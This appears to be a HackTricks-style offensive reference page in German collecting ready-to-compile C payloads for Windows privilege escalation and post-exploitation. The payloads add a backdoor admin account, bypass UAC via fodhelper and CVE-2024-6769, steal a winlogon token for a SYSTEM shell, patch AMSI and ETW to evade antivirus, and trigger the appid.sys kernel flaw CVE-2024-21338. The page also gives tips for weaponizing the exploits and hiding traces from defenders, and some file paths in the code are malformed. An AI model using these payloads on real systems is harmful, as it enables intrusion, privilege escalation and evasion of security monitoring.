# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Diese Seite sammelt **kleine, eigenständige C-Snippets**, die während Windows Local Privilege Escalation oder post-exploitation nützlich sind. Jeder Payload ist so konzipiert, dass er **copy-paste friendly** ist, nur die Windows API / C runtime benötigt und mit `i686-w64-mingw32-gcc` (x86) oder `x86_64-w64-mingw32-gcc` (x64) kompiliert werden kann.

> ⚠️  Diese Payloads setzen voraus, dass der Prozess bereits die minimalen Privilegien besitzt, um die Aktion auszuführen (z. B. `SeDebugPrivilege`, `SeImpersonatePrivilege`, or medium-integrity context for a UAC bypass). Sie sind für **red-team or CTF settings** gedacht, in denen das Ausnutzen einer Schwachstelle beliebige native Codeausführung ermöglicht hat.

---

## Lokalen Administrator hinzufügen
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
When the trusted binary **`fodhelper.exe`** is executed, it queries the registry path below **without filtering the `DelegateExecute` verb**.  By planting our command under that key an attacker can bypass UAC *without* dropping a file to disk.

*Registry path queried by `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Ein minimales PoC, das eine erhöhte `cmd.exe` startet:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Getestet unter Windows 10 22H2 und Windows 11 23H2 (Juli 2025 Patches). Der Bypass funktioniert weiterhin, weil Microsoft die fehlende Integritätsprüfung im `DelegateExecute`-Pfad nicht behoben hat.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning funktioniert weiterhin gegen gepatchte Windows 10/11-Builds, da `ctfmon.exe` als hoch privilegierter, vertrauenswürdiger UI-Prozess läuft, der problemlos vom vom Anrufer impersonierten `C:`-Laufwerk lädt und jede DLL-Umleitung wiederverwendet, die `CSRSS` gecached hat. Der Missbrauch läuft wie folgt ab: `C:` auf einen angreiferkontrollierten Speicher umleiten, eine trojanisierte `msctf.dll` ablegen, `ctfmon.exe` starten, um hohe Integrität zu erlangen, und dann `CSRSS` veranlassen, ein Manifest zu cachen, das eine DLL umleitet, die von einem auto-elevated binary verwendet wird (z. B. `fodhelper.exe`), sodass der nächste Start dein Payload ohne UAC-Eingabe erbt.

Praktischer Ablauf:
1. Bereite einen gefälschten `%SystemRoot%\System32`-Baum vor und kopiere das legitime Binary, das du hijacken willst (häufig `ctfmon.exe`).
2. Verwende `DefineDosDevice(DDD_RAW_TARGET_PATH)`, um `C:` innerhalb deines Prozesses neu zuzuordnen, und behalte `DDD_NO_BROADCAST_SYSTEM` bei, damit die Änderung lokal bleibt.
3. Lege deine DLL + Manifest in den gefälschten Baum, rufe `CreateActCtx/ActivateActCtx` auf, um das Manifest in den activation-context cache zu pushen, und starte dann das auto-elevated binary, damit es die umgeleitete DLL direkt in deinen shellcode auflöst.
4. Lösche den Cache-Eintrag (`sxstrace ClearCache`) oder starte neu, wenn du fertig bist, um Angreifer-Spuren zu entfernen.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Bereinigungs-Tipp: Nachdem du SYSTEM erlangt hast, rufe beim Testen `sxstrace Trace -logfile %TEMP%\sxstrace.etl` gefolgt von `sxstrace Parse` auf — wenn du deinen Manifestnamen im Log siehst, können das auch Verteidiger sehen, also wechsle die Pfade bei jedem Lauf.

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Wenn der aktuelle Prozess **beide** `SeDebug`- und `SeImpersonate`-Privilegien besitzt (typisch für viele Dienstkonten), kannst du das Token von `winlogon.exe` stehlen, es duplizieren und einen erhöhten Prozess starten:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Für eine ausführlichere Erklärung, wie das funktioniert, siehe:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Die meisten modernen AV/EDR-Engines verlassen sich auf **AMSI** und **ETW**, um bösartiges Verhalten zu überprüfen. Das Patchen beider Schnittstellen früh im aktuellen Prozess verhindert, dass skriptbasierte Payloads (z. B. PowerShell, JScript) gescannt werden.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Der obige Patch ist prozesslokal; das Starten einer neuen PowerShell nach dessen Ausführung wird ohne AMSI/ETW-Inspektion ausgeführt.*

---

## Kindprozess als Protected Process Light (PPL) erstellen
Fordere beim Erstellen eines Kindprozesses ein PPL-Schutzniveau mit `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` an. Dies ist eine dokumentierte API und funktioniert nur, wenn das Zielimage für die angeforderte Signer-Klasse signiert ist (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Levels used most commonly:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Überprüfe das Ergebnis mit Process Explorer/Process Hacker, indem du die Protection-Spalte prüfst.

---

## Local Service -> Kernel über `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` stellt ein Device-Objekt (`\\.\\AppID`) bereit, dessen Smart-Hash-Wartungs-IOCTL benutzersupplied Function-Pointer akzeptiert, wann immer der Aufrufer als `LOCAL SERVICE` läuft; Lazarus missbraucht das, um PPL zu deaktivieren und beliebige Treiber zu laden, daher sollten Red teams einen fertigen Trigger für Laboreinsätze haben.

Betriebliche Hinweise:
- You still need a `LOCAL SERVICE` token. Beschaffe es von `Schedule` oder `WdiServiceHost` unter Verwendung von `SeImpersonatePrivilege`, und führe dann die Impersonation aus, bevor du das Device anfasst, damit die ACL-Prüfungen bestehen.
- IOCTL `0x22A018` erwartet eine struct, die zwei Callback-Pointer enthält (query length + read function). Richte beide auf user-mode Stubs, die ein Token-Overwrite oder ring-0-Primitives erzeugen, aus, aber halte die Buffers RWX, damit KernelPatchGuard nicht mitten in der Kette crasht.
- Nach Erfolg beende die Impersonation und gib den Device-Handle frei; Defender suchen jetzt nach unerwarteten `Device\\AppID`-Handles, schließe ihn also sofort, sobald Privilegien erlangt sind.

<details>
<summary>C - Skelett-Trigger für `appid.sys` Smart-Hash-Missbrauch</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Minimale Nachbesserung für einen weaponized Build: mappe eine RWX section mit `VirtualAlloc`, kopiere deinen token duplication stub dorthin, setze `KernelThunk = section`, und sobald `DeviceIoControl` zurückkehrt, solltest du SYSTEM sein, sogar unter PPL.

---

## Referenzen
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – minimal PPL process launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
